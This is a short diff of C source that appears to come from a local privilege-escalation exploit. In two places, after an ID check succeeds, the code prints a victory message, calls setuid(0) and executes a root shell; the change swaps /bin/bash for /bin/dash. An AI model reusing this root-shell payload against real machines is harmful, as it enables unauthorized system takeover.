@@ -118,7 +118,7 @@ GPIO_CLR = 1 << 4;
     printf("winner winner chicken dinner (getresuid)");
     fflush(stdout);
     setuid(0);
-    execve("/bin/bash",0,0);
+    execve("/bin/dash",0,0);
   }
 
   printf("gri:%d/%d/%d",id0,id1,id2);
@@ -128,7 +128,7 @@ GPIO_CLR = 1 << 4;
     printf("winner winner chicken dinner (geteuid)");
     fflush(stdout);
     setuid(0);
-    execve("/bin/bash",0,0);
+    execve("/bin/dash",0,0);
   }
 
   return 0;
